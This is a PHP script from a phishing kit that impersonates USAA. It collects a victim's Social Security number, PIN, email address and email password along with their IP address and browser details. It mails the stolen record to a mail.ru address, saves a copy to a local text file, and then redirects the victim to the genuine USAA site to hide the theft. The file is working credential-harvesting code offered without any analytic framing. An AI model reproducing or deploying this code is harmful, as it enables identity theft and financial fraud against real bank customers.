<?php
$ip = getenv("REMOTE_ADDR");$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$message  = "========+[ USAA Contact Page ]+=========\n";
$message .= "SSN : ".$_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3']."\n";
$message .= "PIN : ".$_POST['pin']."\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Email Pass : ".$_POST['emailpassword']."\n";
$message .= "HostName : ".$hostname."\n";

$message .= "Date And Time : ".$date."\n";

$message .= "Browser Details : ".$user_agent."\n";
$send = "gerasimovaveroniya6419@mail.ru";
$subject = "USAA DETAILS | $ip";
$headers = "From: USAC  <legit@mrmoz.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
$fp = fopen("../sn3.txt","a");
fputs($fp,$message);
fclose($fp); 
header("Location: https://www.usaa.com/inet/ent_logon/Logoff?");
?>
